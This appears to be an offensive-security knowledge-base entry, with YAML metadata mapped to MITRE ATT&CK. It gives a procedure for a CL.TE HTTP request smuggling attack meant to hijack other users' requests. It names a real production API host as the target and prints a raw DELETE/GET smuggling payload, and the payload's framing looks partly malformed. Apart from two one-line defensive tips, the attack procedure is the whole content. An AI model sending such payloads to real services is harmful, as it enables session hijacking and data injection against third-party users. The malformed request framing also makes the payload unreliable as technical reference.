---
tags:
  - http-request-smuggling
  - request-hijacking
type: procedure
tools:
  - '[[tools/Custom-HTTP-Smuggling-Tools]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/smuggle-request-basic]]'
  - '[[commands/smuggle-request-token-theft]]'
  - '[[commands/smuggle-request-triage]]'
  - '[[commands/get-userid]]'
  - '[[commands/get-userdetails]]'
  - '[[commands/post-auth]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 10da7e30-b5fd-4820-84dd-cdb35fbd68f4
created_at: '2025-12-11T06:10:24.564Z'
updated_at: '2025-12-11T06:10:24.564Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
---
# Craft Smuggling Payload for Request Hijacking

## Summary

This procedure crafts a custom HTTP request smuggling payload to hijack victim requests by poisoning the backend socket with prepended attacker data.

## Description

Using a DELETE method with dual headers (Content-Length and malformed Transfer-Encoding), the payload exploits desync to force redirections or modifications on victim requests. It is used in web environments with mismatched server parsing, leading to session hijacking or data injection.

## Requirements

1. Target vulnerable to CL.TE smuggling (e.g., api.zomato.com)
2. Ability to send raw HTTP requests
3. Knowledge of HTTP chunked encoding

## Defense

Defensive measures and detection strategies:

- Normalize HTTP headers across all servers
- Log and alert on requests with conflicting transfer mechanisms

## Objectives

1. Poison backend socket
2. Hijack and redirect victim requests
3. Demonstrate exploitation potential

## Instructions

### Step 1: Construct and Send Payload

**Context**: Create the smuggling request to prepend data.

Execute [[commands/smuggle-request-basic]]:

```bash
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0
GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

> This sends 51 bytes via Content-Length to the frontend, but backend sees chunked with prepended GET.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/smuggle-request-basic]]

## Tools Used



## Tags

- [[tools/Custom-HTTP-Smuggling-Tools]]
- [[request-hijacking]]
